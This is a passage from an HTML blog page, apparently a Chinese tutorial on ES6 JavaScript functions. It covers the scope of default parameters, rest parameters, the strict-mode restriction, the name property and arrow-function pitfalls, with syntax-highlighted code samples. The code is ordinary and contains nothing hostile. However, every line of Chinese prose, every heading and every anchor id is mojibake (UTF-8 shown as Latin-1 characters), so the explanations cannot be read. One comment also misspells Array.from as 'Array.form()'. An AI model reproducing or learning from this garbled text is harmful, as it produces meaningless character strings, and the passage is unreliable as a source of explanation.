å…¥çš„å‚æ•°ä¸ªæ•°å°±ä¸åŒ…æ‹¬è¿™ä¸ªå‚æ•°äº†ã€‚</p><p>å¦‚æœè®¾ç½®äº†é»˜è®¤å€¼çš„å‚æ•°ä¸æ˜¯å°¾å‚æ•°ï¼Œé‚£ä¹ˆ<code>length</code>å±æ€§ä¹Ÿä¸å†è®¡å…¥åé¢çš„å‚æ•°äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a = <span class="number">0</span>, b, c</span>) </span>&#123;&#125;).length <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">a, b = <span class="number">1</span>, c</span>) </span>&#123;&#125;).length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><h3 id="ä½œç”¨åŸŸ"><a href="#ä½œç”¨åŸŸ" class="headerlink" title="ä½œç”¨åŸŸ"></a>ä½œç”¨åŸŸ</h3><p>ä¸€æ—¦è®¾ç½®äº†å‚æ•°çš„é»˜è®¤å€¼ï¼Œå‡½æ•°è¿›è¡Œå£°æ˜åˆå§‹åŒ–æ—¶ï¼Œå‚æ•°ä¼šå½¢æˆä¸€ä¸ªå•ç‹¬çš„ä½œç”¨åŸŸï¼ˆcontextï¼‰ã€‚ç­‰åˆ°åˆå§‹åŒ–ç»“æŸï¼Œè¿™ä¸ªä½œç”¨åŸŸå°±ä¼šæ¶ˆå¤±ã€‚è¿™ç§è¯­æ³•è¡Œä¸ºï¼Œåœ¨ä¸è®¾ç½®å‚æ•°é»˜è®¤å€¼æ—¶ï¼Œæ˜¯ä¸ä¼šå‡ºç°çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x, y = x</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f(<span class="number">2</span>) <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå‚æ•°<code>y</code>çš„é»˜è®¤å€¼ç­‰äºå˜é‡<code>x</code>ã€‚è°ƒç”¨å‡½æ•°<code>f</code>æ—¶ï¼Œå‚æ•°å½¢æˆä¸€ä¸ªå•ç‹¬çš„ä½œç”¨åŸŸã€‚åœ¨è¿™ä¸ªä½œç”¨åŸŸé‡Œé¢ï¼Œé»˜è®¤å€¼å˜é‡<code>x</code>æŒ‡å‘ç¬¬ä¸€ä¸ªå‚æ•°<code>x</code>ï¼Œè€Œä¸æ˜¯å…¨å±€å˜é‡<code>x</code>ï¼Œæ‰€ä»¥è¾“å‡ºæ˜¯<code>2</code>ã€‚</p><p>å†çœ‹ä¸‹é¢çš„ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">y = x</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> x = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f() <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå‡½æ•°<code>f</code>è°ƒç”¨æ—¶ï¼Œå‚æ•°<code>y = x</code>å½¢æˆä¸€ä¸ªå•ç‹¬çš„ä½œç”¨åŸŸã€‚è¿™ä¸ªä½œç”¨åŸŸé‡Œé¢ï¼Œå˜é‡<code>x</code>æœ¬èº«æ²¡æœ‰å®šä¹‰ï¼Œæ‰€ä»¥æŒ‡å‘å¤–å±‚çš„å…¨å±€å˜é‡<code>x</code>ã€‚å‡½æ•°è°ƒç”¨æ—¶ï¼Œå‡½æ•°ä½“å†…éƒ¨çš„å±€éƒ¨å˜é‡<code>x</code>å½±å“ä¸åˆ°é»˜è®¤å€¼å˜é‡<code>x</code>ã€‚</p><p>å¦‚æœå‚æ•°çš„é»˜è®¤å€¼æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨åŸŸä¹Ÿéµå®ˆè¿™ä¸ªè§„åˆ™ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> foo = <span class="string">&#x27;outer&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params">func = () =&gt; foo</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> foo = <span class="string">&#x27;inner&#x27;</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(func());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// outer</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå‡½æ•°<code>bar</code>çš„å‚æ•°<code>func</code>çš„é»˜è®¤å€¼æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œè¿”å›å€¼ä¸ºå˜é‡<code>foo</code>ã€‚å‡½æ•°å‚æ•°å½¢æˆçš„å•ç‹¬ä½œç”¨åŸŸé‡Œé¢ï¼Œå¹¶æ²¡æœ‰å®šä¹‰å˜é‡<code>foo</code>ï¼Œæ‰€ä»¥<code>foo</code><strong>æŒ‡å‘å¤–å±‚çš„å…¨å±€å˜é‡</strong><code>foo</code>ï¼Œå› æ­¤è¾“å‡º<code>outer</code>ã€‚</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ›´å¤æ‚çš„ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">x, y = <span class="keyword">function</span>() &#123; x = <span class="number">2</span>; &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> x = <span class="number">3</span>;</span><br><span class="line">  y();</span><br><span class="line">  <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo() <span class="comment">// 3</span></span><br><span class="line">x <span class="comment">// 1</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå‡½æ•°<code>foo</code>çš„å‚æ•°å½¢æˆä¸€ä¸ªå•ç‹¬ä½œç”¨åŸŸã€‚è¿™ä¸ªä½œç”¨åŸŸé‡Œé¢ï¼Œé¦–å…ˆå£°æ˜äº†å˜é‡<code>x</code>ï¼Œç„¶åå£°æ˜äº†å˜é‡<code>y</code>ï¼Œ<code>y</code>çš„é»˜è®¤å€¼æ˜¯ä¸€ä¸ªåŒ¿åå‡½æ•°ã€‚è¿™ä¸ªåŒ¿åå‡½æ•°å†…éƒ¨çš„å˜é‡<code>x</code>ï¼ŒæŒ‡å‘åŒä¸€ä¸ªä½œç”¨åŸŸçš„ç¬¬ä¸€ä¸ªå‚æ•°<code>x</code>ã€‚å‡½æ•°<code>foo</code>å†…éƒ¨åˆå£°æ˜äº†ä¸€ä¸ªå†…éƒ¨å˜é‡<code>x</code>ï¼Œè¯¥å˜é‡ä¸ç¬¬ä¸€ä¸ªå‚æ•°<code>x</code>ç”±äºä¸æ˜¯åŒä¸€ä¸ªä½œç”¨åŸŸï¼Œæ‰€ä»¥ä¸æ˜¯åŒä¸€ä¸ªå˜é‡ï¼Œå› æ­¤æ‰§è¡Œ<code>y</code>åï¼Œå†…éƒ¨å˜é‡<code>x</code>å’Œå¤–éƒ¨å…¨å±€å˜é‡<code>x</code>çš„å€¼éƒ½æ²¡å˜ã€‚</p><p>å¦‚æœå°†<code>var x = 3</code>çš„<code>var</code>å»é™¤ï¼Œå‡½æ•°<code>foo</code>çš„å†…éƒ¨å˜é‡<code>x</code>å°±æŒ‡å‘ç¬¬ä¸€ä¸ªå‚æ•°<code>x</code>ï¼Œä¸åŒ¿åå‡½æ•°å†…éƒ¨çš„<code>x</code>æ˜¯ä¸€è‡´çš„ï¼Œæ‰€ä»¥æœ€åè¾“å‡ºçš„å°±æ˜¯<code>2</code>ï¼Œè€Œå¤–å±‚çš„å…¨å±€å˜é‡<code>x</code>ä¾ç„¶ä¸å—å½±å“ã€‚</p><h3 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h3><p>åˆ©ç”¨å‚æ•°é»˜è®¤å€¼ï¼Œå¯ä»¥æŒ‡å®šæŸä¸€ä¸ªå‚æ•°ä¸å¾—çœç•¥ï¼Œå¦‚æœçœç•¥å°±æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">throwIfMissing</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;Missing parameter&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">mustBeProvided = throwIfMissing()</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mustBeProvided;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo()</span><br><span class="line"><span class="comment">// Error: Missing parameter</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç çš„<code>foo</code>å‡½æ•°ï¼Œå¦‚æœè°ƒç”¨çš„æ—¶å€™æ²¡æœ‰å‚æ•°ï¼Œå°±ä¼šè°ƒç”¨é»˜è®¤å€¼<code>throwIfMissing</code>å‡½æ•°ï¼Œä»è€ŒæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p><p>è¿˜å¯ä»¥å°†å‚æ•°é»˜è®¤å€¼è®¾ä¸º<code>undefined</code>ï¼Œè¡¨æ˜è¿™ä¸ªå‚æ•°æ˜¯å¯ä»¥çœç•¥çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">optional = <span class="literal">undefined</span></span>) </span>&#123; Â·Â·Â· &#125;</span><br></pre></td></tr></table></figure><h2 id="2ã€rest-å‚æ•°"><a href="#2ã€rest-å‚æ•°" class="headerlink" title="2ã€rest å‚æ•°"></a>2ã€rest å‚æ•°</h2><p>ES6 å¼•å…¥ rest å‚æ•°ï¼ˆå½¢å¼ä¸º<code>...å˜é‡å</code>ï¼‰ï¼Œç”¨äºè·å–å‡½æ•°çš„å¤šä½™å‚æ•°ï¼Œè¿™æ ·å°±ä¸éœ€è¦ä½¿ç”¨<code>arguments</code>å¯¹è±¡äº†ã€‚rest å‚æ•°æ­é…çš„å˜é‡æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè¯¥å˜é‡å°†å¤šä½™çš„å‚æ•°æ”¾å…¥æ•°ç»„ä¸­ã€‚</p><p>rest å‚æ•°ä»£æ›¿<code>arguments</code>å˜é‡çš„ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// argumentså˜é‡çš„å†™æ³• argumentså¯¹è±¡æ˜¯ç±»æ•°ç»„ã€‚æ‰€ä»¥å¿…é¡»ä½¿ç”¨Array.prototype.slice.callå…ˆå°†å…¶è½¬ä¸ºæ•°ç»„ã€‚ æˆ–Array.form()ï¼Ÿ</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortNumbers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>).sort();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// restå‚æ•°çš„å†™æ³•</span></span><br><span class="line"><span class="keyword">const</span> sortNumbers = <span class="function">(<span class="params">...numbers</span>) =&gt;</span> numbers.sort();</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨ rest å‚æ•°æ”¹å†™æ•°ç»„<code>push</code>æ–¹æ³•çš„ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">array, ...items</span>) </span>&#123;</span><br><span class="line">  items.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    array.push(item);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line">push(a, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œrest å‚æ•°ä¹‹åä¸èƒ½å†æœ‰å…¶ä»–å‚æ•°ï¼ˆå³åªèƒ½æ˜¯æœ€åä¸€ä¸ªå‚æ•°ï¼‰ã€‚å‡½æ•°çš„<code>length</code>å±æ€§ï¼Œä¸åŒ…æ‹¬ rest å‚æ•°ã€‚</p><h2 id="3ã€ä¸¥æ ¼æ¨¡å¼"><a href="#3ã€ä¸¥æ ¼æ¨¡å¼" class="headerlink" title="3ã€ä¸¥æ ¼æ¨¡å¼"></a>3ã€ä¸¥æ ¼æ¨¡å¼</h2><p>ES2016 è§„å®šåªè¦å‡½æ•°å‚æ•°ä½¿ç”¨äº†é»˜è®¤å€¼ã€è§£æ„èµ‹å€¼ã€æˆ–è€…æ‰©å±•è¿ç®—ç¬¦ï¼Œé‚£ä¹ˆå‡½æ•°å†…éƒ¨å°±ä¸èƒ½æ˜¾å¼è®¾å®šä¸ºä¸¥æ ¼æ¨¡å¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><p>è¿™æ ·è§„å®šçš„åŸå› æ˜¯ï¼Œå‡½æ•°å†…éƒ¨çš„ä¸¥æ ¼æ¨¡å¼ï¼ŒåŒæ—¶é€‚ç”¨äºå‡½æ•°ä½“å’Œå‡½æ•°å‚æ•°ã€‚ä½†æ˜¯ï¼Œå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œå…ˆæ‰§è¡Œå‡½æ•°å‚æ•°ï¼Œç„¶åå†æ‰§è¡Œå‡½æ•°ä½“ã€‚è¿™æ ·å°±æœ‰ä¸€ä¸ªä¸åˆç†çš„åœ°æ–¹ï¼Œåªæœ‰ä»å‡½æ•°ä½“ä¹‹ä¸­ï¼Œæ‰èƒ½çŸ¥é“å‚æ•°æ˜¯å¦åº”è¯¥ä»¥ä¸¥æ ¼æ¨¡å¼æ‰§è¡Œï¼Œä½†æ˜¯å‚æ•°å´åº”è¯¥å…ˆäºå‡½æ•°ä½“æ‰§è¡Œã€‚</p><h2 id="4ã€name-å±æ€§"><a href="#4ã€name-å±æ€§" class="headerlink" title="4ã€name å±æ€§"></a>4ã€name å±æ€§</h2><p>å‡½æ•°çš„<code>name</code>å±æ€§ï¼Œè¿”å›è¯¥å‡½æ•°çš„å‡½æ•°åã€‚å¦‚æœå°†ä¸€ä¸ªåŒ¿åå‡½æ•°èµ‹å€¼ç»™ä¸€ä¸ªå˜é‡ï¼ŒES5 çš„<code>name</code>å±æ€§ï¼Œä¼šè¿”å›ç©ºå­—ç¬¦ä¸²ï¼Œè€Œ ES6 çš„<code>name</code>å±æ€§ä¼šè¿”å›å®é™…çš„å‡½æ•°åã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5</span></span><br><span class="line">f.name <span class="comment">// &quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6</span></span><br><span class="line">f.name <span class="comment">// &quot;f&quot;</span></span><br></pre></td></tr></table></figure><p><code>Function</code>æ„é€ å‡½æ•°è¿”å›çš„å‡½æ•°å®ä¾‹ï¼Œ<code>name</code>å±æ€§çš„å€¼ä¸º<code>anonymous</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="built_in">Function</span>).name <span class="comment">// &quot;anonymous&quot;</span></span><br></pre></td></tr></table></figure><p><code>bind</code>è¿”å›çš„å‡½æ•°ï¼Œ<code>name</code>å±æ€§å€¼ä¼šåŠ ä¸Š<code>bound</code>å‰ç¼€ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;&#125;;</span><br><span class="line">foo.bind(&#123;&#125;).name <span class="comment">// &quot;bound foo&quot;</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;).bind(&#123;&#125;).name <span class="comment">// &quot;bound &quot;</span></span><br></pre></td></tr></table></figure><h2 id="5ã€ç®­å¤´å‡½æ•°"><a href="#5ã€ç®­å¤´å‡½æ•°" class="headerlink" title="5ã€ç®­å¤´å‡½æ•°"></a>5ã€ç®­å¤´å‡½æ•°</h2><h3 id="åŸºæœ¬ç”¨æ³•-4"><a href="#åŸºæœ¬ç”¨æ³•-4" class="headerlink" title="åŸºæœ¬ç”¨æ³•"></a>åŸºæœ¬ç”¨æ³•</h3><p>ç”±äºå¤§æ‹¬å·è¢«è§£é‡Šä¸ºä»£ç å—ï¼Œæ‰€ä»¥å¦‚æœç®­å¤´å‡½æ•°ç›´æ¥è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œå¿…é¡»åœ¨å¯¹è±¡å¤–é¢åŠ ä¸Šæ‹¬å·ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æŠ¥é”™</span></span><br><span class="line"><span class="keyword">let</span> getTempItem = <span class="function"><span class="params">id</span> =&gt;</span> &#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">&quot;Temp&quot;</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¸æŠ¥é”™</span></span><br><span class="line"><span class="keyword">let</span> getTempItem = <span class="function"><span class="params">id</span> =&gt;</span> (&#123; <span class="attr">id</span>: id, <span class="attr">name</span>: <span class="string">&quot;Temp&quot;</span> &#125;);</span><br></pre></td></tr></table></figure><p>ç®­å¤´å‡½æ•°å¯ä»¥ä¸å˜é‡è§£æ„ç»“åˆä½¿ç”¨ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> full = <span class="function">(<span class="params">&#123; first, last &#125;</span>) =&gt;</span> first + <span class="string">&#x27; &#x27;</span> + last;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç­‰åŒäº</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">full</span>(<span class="params">person</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> person.first + <span class="string">&#x27; &#x27;</span> + person.last;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>rest å‚æ•°ä¸ç®­å¤´å‡½æ•°ç»“åˆçš„ä¾‹å­ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> numbers = <span class="function">(<span class="params">...nums</span>) =&gt;</span> nums;</span><br><span class="line"></span><br><span class="line">numbers(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">// [1,2,3,4,5]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> headAndTail = <span class="function">(<span class="params">head, ...tail</span>) =&gt;</span> [head, tail];</span><br><span class="line"></span><br><span class="line">headAndTail(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment">// [1,[2,3,4,5]]</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨æ³¨æ„ç‚¹"><a href="#ä½¿ç”¨æ³¨æ„ç‚¹" class="headerlink" title="ä½¿ç”¨æ³¨æ„ç‚¹"></a>ä½¿ç”¨æ³¨æ„ç‚¹</h3><p>ç®­å¤´å‡½æ•°æœ‰å‡ ä¸ªä½¿ç”¨æ³¨æ„ç‚¹ã€‚</p><p>ï¼ˆ1ï¼‰ç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„<code>this</code>å¯¹è±¡ã€‚å†…éƒ¨çš„<code>this</code>å°±æ˜¯å®šä¹‰æ—¶ä¸Šå±‚ä½œç”¨åŸŸä¸­çš„<code>this</code>ã€‚</p><p>ï¼ˆ2ï¼‰ä¸å¯ä»¥å½“ä½œæ„é€ å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¯ä»¥å¯¹ç®­å¤´å‡½æ•°ä½¿ç”¨<code>new</code>å‘½ä»¤ï¼Œå¦åˆ™ä¼šæŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p><p>ï¼ˆ3ï¼‰ä¸å¯ä»¥ä½¿ç”¨<code>arguments</code>å¯¹è±¡ï¼Œè¯¥å¯¹è±¡åœ¨å‡½æ•°ä½“å†…ä¸å­˜åœ¨ã€‚å¦‚æœè¦ç”¨ï¼Œå¯ä»¥ç”¨ rest å‚æ•°ä»£æ›¿ã€‚</p><p>ï¼ˆ4ï¼‰ä¸å¯ä»¥ä½¿ç”¨<code>yield</code>å‘½ä»¤ï¼Œå› æ­¤ç®­å¤´å‡½æ•°ä¸èƒ½ç”¨ä½œ Generator å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;id:&#x27;</span>, <span class="built_in">this</span>.id);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> id = <span class="number">21</span>;</span><br><span class="line"></span><br><span class="line">foo.call(&#123; <span class="attr">id</span>: <span class="number">42</span> &#125;);</span><br><span class="line"><span class="comment">// id: 42</span></span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œ<code>setTimeout()</code>çš„å‚æ•°æ˜¯ä¸€ä¸ªç®­å¤´å‡½æ•°ï¼Œè¿™ä¸ªç®­å¤´å‡½æ•°çš„å®šä¹‰ç”Ÿæ•ˆæ˜¯åœ¨<code>foo</code>å‡½æ•°ç”Ÿæˆæ—¶ï¼Œè€Œå®ƒçš„çœŸæ­£æ‰§è¡Œè¦ç­‰åˆ° 100 æ¯«ç§’åã€‚å¦‚æœæ˜¯æ™®é€šå‡½æ•°ï¼Œæ‰§è¡Œæ—¶<code>this</code>åº”è¯¥æŒ‡å‘<strong>å…¨å±€å¯¹è±¡</strong><code>window</code>ï¼Œè¿™æ—¶åº”è¯¥è¾“å‡º<code>21</code>ã€‚ä½†æ˜¯ï¼Œ<strong>ç®­å¤´å‡½æ•°</strong>å¯¼è‡´<code>this</code>æ€»æ˜¯æŒ‡å‘<strong>å‡½æ•°å®šä¹‰ç”Ÿæ•ˆæ—¶æ‰€åœ¨çš„å¯¹è±¡</strong>ï¼ˆæœ¬ä¾‹æ˜¯<code>&#123;id: 42&#125;</code>ï¼‰ï¼Œæ‰€ä»¥æ‰“å°å‡ºæ¥çš„æ˜¯<code>42</code>ã€‚</p><p>ç®­å¤´å‡½æ•°å®é™…ä¸Šå¯ä»¥è®©<code>this</code>æŒ‡å‘å›ºå®šåŒ–ï¼Œç»‘å®š<code>this</code>ä½¿å¾—å®ƒä¸å†å¯å˜ï¼Œè¿™ç§ç‰¹æ€§å¾ˆæœ‰åˆ©äºå°è£…å›è°ƒå‡½æ•°ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼ŒDOM äº‹ä»¶çš„å›è°ƒå‡½æ•°å°è£…åœ¨ä¸€ä¸ªå¯¹è±¡é‡Œé¢ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> handler = &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line"></span><br><span class="line">  <span class="attr">init</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">      <span class="function"><span class="params">event</span> =&gt;</span> <span class="built_in">this</span>.doSomething(event.type), <span class="literal">false</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">doSomething</span>: <span class="function"><span class="keyword">function</span>(<span class="params">type</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Handling &#x27;</span> + type  + <span class="string">&#x27; for &#x27;</span> + <span class="built_in">this</span>.id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç çš„<code>init()</code>æ–¹æ³•ä¸­ï¼Œä½¿ç”¨äº†ç®­å¤´å‡½æ•°ï¼Œè¿™å¯¼è‡´è¿™ä¸ªç®­å¤´å‡½æ•°é‡Œé¢çš„<code>this</code>ï¼Œæ€»æ˜¯æŒ‡å‘<code>handler</code>å¯¹è±¡ã€‚å¦‚æœå›è°ƒå‡½æ•°æ˜¯æ™®é€šå‡½æ•°ï¼Œé‚£ä¹ˆè¿è¡Œ<code>this.doSomething()</code>è¿™ä¸€è¡Œä¼šæŠ¥é”™ï¼Œå› ä¸ºæ­¤æ—¶<code>this</code>æŒ‡å‘<code>document</code>å¯¹è±¡ã€‚</p><p><code>arguments</code>ã€<code>super</code>ã€<code>new.target</code>ä¸‰ä¸ªå˜é‡åœ¨ç®­å¤´å‡½æ•°ä¹‹ä¸­ä¹Ÿæ˜¯ä¸å­˜åœ¨çš„ï¼ŒæŒ‡å‘å¤–å±‚å‡½æ•°çš„å¯¹åº”å˜é‡ï¼š</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;args:&#x27;</span>, <span class="built_in">arguments</span>);</span><br><span class="line">  &#125;, <span class="number">100</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>)</span><br><span class="line"><span class="comment">// args: [2, 4, 6, 8]</span></span><br></pre></td></tr></table></figure><p>ç”±äºç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„<code>this</code>ï¼Œæ‰€ä»¥å½“ç„¶ä¹Ÿå°±ä¸èƒ½ç”¨<code>call()</code>ã€<code>apply()</code>ã€<code>bind()</code>è¿™äº›æ–¹æ³•å»æ”¹å˜<code>this</code>çš„æŒ‡å‘ã€‚</p><h3 id="ä¸é€‚ç”¨åœºåˆ"><a href="#ä¸é€‚ç”¨åœºåˆ" class="headerlink" title="ä¸é€‚ç”¨åœºåˆ"></a>ä¸é€‚ç”¨åœºåˆ</h3><p>ç¬¬ä¸€ä¸ªåœºåˆæ˜¯å®šä¹‰å¯¹è±¡çš„æ–¹æ³•ï¼Œä¸”è¯¥æ–¹æ³•å†…éƒ¨åŒ…æ‹¬<code>this</code>ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cat = &#123;</span><br><span class="line">  <span class="attr">lives</span>: <span class="number">9</span>,</span><br><span class="line">  <span class="attr">jumps</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.lives--;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªåœºåˆæ˜¯éœ€è¦åŠ¨æ€<code>this</code>çš„æ—¶å€™ï¼Œä¹Ÿä¸åº”ä½¿ç”¨ç®­å¤´å‡½æ•°ã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> button = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;press&#x27;</span>);</span><br><span class="line">button.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.classList.toggle(<span class="string">&#x27;on&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç è¿è¡Œæ—¶ï¼Œç‚¹å‡»æŒ‰é’®ä¼šæŠ¥é”™ï¼Œå› 